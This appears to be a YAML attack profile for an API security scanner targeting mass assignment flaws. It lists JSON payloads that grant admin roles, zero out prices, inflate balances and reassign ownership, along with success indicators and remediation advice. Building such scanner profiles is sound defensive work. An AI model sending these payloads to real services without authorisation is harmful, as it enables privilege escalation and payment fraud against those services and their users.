# Mass Assignment - Attack Profile
# This file defines payloads for testing Mass Assignment vulnerabilities
# References: OWASP API3:2023, CWE-915

name: "Mass Assignment / Parameter Pollution"
category: "integrity_failures"
severity: "high"
description: "Tests for mass assignment vulnerabilities in JSON body and form data submissions, where internal fields are exposed and can be overwritten."

# target_fields: Holds model field names only
target_fields:
  - "role"
  - "is_admin"
  - "admin"
  - "permissions"
  - "user_type"
  - "group"
  - "price"
  - "amount"
  - "cost"
  - "discount"
  - "balance"
  - "status"
  - "state"
  - "verified"
  - "approved"
  - "active"
  - "banned"
  - "user_id"
  - "owner_id"
  - "account_id"
  - "created_by"
  - "email_verified"

payloads:
  # --- Privilege Escalation ---
  - '{"role": "admin"}'
  - '{"role": "superuser"}'
  - '{"is_admin": true}'
  - '{"isAdmin": true}'
  - '{"admin": true}'
  - '{"type": "admin"}'
  - '{"user_type": "admin"}'
  - '{"permissions": "all"}'
  - '{"permissions": ["admin"]}'
  - '{"group": "admins"}'
  - '{"roles": ["admin"]}'

  # --- Price / Payment Tampering ---
  - '{"price": 0}'
  - '{"price": 0.01}'
  - '{"amount": 0}'
  - '{"cost": 0}'
  - '{"discount": 100}'
  - '{"discount_percent": 100}'
  - '{"total": 0}'
  - '{"balance": 1000000}'
  - '{"credit": 1000000}'
  
  # --- Status Manipulation ---
  - '{"status": "active"}'
  - '{"status": "verified"}'
  - '{"status": "approved"}'
  - '{"verified": true}'
  - '{"email_verified": true}'
  - '{"active": true}'
  - '{"banned": false}'
  - '{"state": "paid"}'
  
  # --- Ownership Override ---
  - '{"user_id": 1}'
  - '{"owner_id": 1}'
  - '{"account_id": 1}'
  - '{"created_by": 1}'
  - '{"created_by": "admin"}'
  - '{"organization_id": 1}'

  # --- Nested Object Injection ---
  - '{"user": {"is_admin": true}}'
  - '{"user": {"role": "admin"}}'
  - '{"profile": {"permissions": {"admin": true}}}'
  - '{"attributes": {"role": "superuser"}}'

  # --- Dot-Notation Parameter Pollution ---
  # Frameworks that parse dot-notation keys as nested paths may incorrectly
  # map this to nested field access (e.g., user.permissions.admin = true)
  - '{"user.permissions.admin": true}'

  # --- Naming Variants ---
  - '{"isStaff": true}'
  - '{"is_staff": true}'
  - '{"userRole": "admin"}'
  - '{"accountBalance": 1000000}'
  - '{"isVerified": true}'

# NOTE: HTTP Parameter Pollution (HPP) payloads via URL-encoded strings 
# were removed to prevent JSON schema mismatches per maintainer review.

success_indicators:
  response_contains:
    # Privilege Escalation
    - '"role": "admin"'
    - '"is_admin": true'
    - '"isAdmin": true'
    - '"type": "admin"'
    - '"permissions": ["admin"]'
    
    # Financial Tampering
    - '"price": 0'
    - '"amount": 0'
    - '"discount": 100'
    - '"balance": 1000000'
    
    # Status Changes
    - '"verified": true'
    - '"status": "active"'
    - '"status": "approved"'
    
    # Ownership
    - '"user_id": 1'
    - '"owner_id": 1'

    # Naming Variants Detection
    - "isStaff"
    - "is_staff"
    - "userRole"
    - "accountBalance"
    - "isVerified"
    
    # General
    - "successfully updated"
    - "200 OK"
    
  status_codes:
    - 200
    - 201
    
  diff_check: true

# behavior_change notes (Moving to comments as suggested):
# - access to administrative panels granted
# - unauthorized price modification reflected

remediation: |
  Prevent Mass Assignment by explicitly defining which fields can be bound from client input.
  Use DTOs (Data Transfer Objects) to decouple request input from internal database models.
  Implement strict Allow-lists for all user-writable fields.

references:
  - "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/"
  - "https://cwe.mitre.org/data/definitions/915.html"